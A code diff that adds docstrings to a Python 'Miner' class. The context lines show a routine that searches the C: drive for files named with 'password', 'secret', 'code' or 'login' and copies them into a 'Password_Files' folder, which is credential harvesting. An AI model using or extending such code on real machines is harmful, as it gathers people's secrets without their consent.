@@ -7,6 +7,15 @@ from __lib_log import *
 class Miner:
     @staticmethod
     def __search_and_copy_files(keyword):
+        """
+        Searches for files containing the specified keyword in their names and copies them to a destination directory.
+
+        Args:
+            keyword (str): The keyword to search for in file names.
+
+        Returns:
+            None
+        """
         drives_root = Path("C:\\")
         destination = Path("Password_Files")
 
@@ -50,6 +59,13 @@ class Miner:
                 log.error(f"Failed to copy file: {e}")
 
     def passwords(self):
+        """
+        Searches for files containing sensitive data keywords in their filenames,
+        copies them to a 'Password Files' directory, and logs the completion of the task.
+
+        Returns:
+            None
+        """
         # Keywords to search for in filenames
         keywords = ["password", "secret", "code", "login"]
         if os.path.exists("Password Files"):
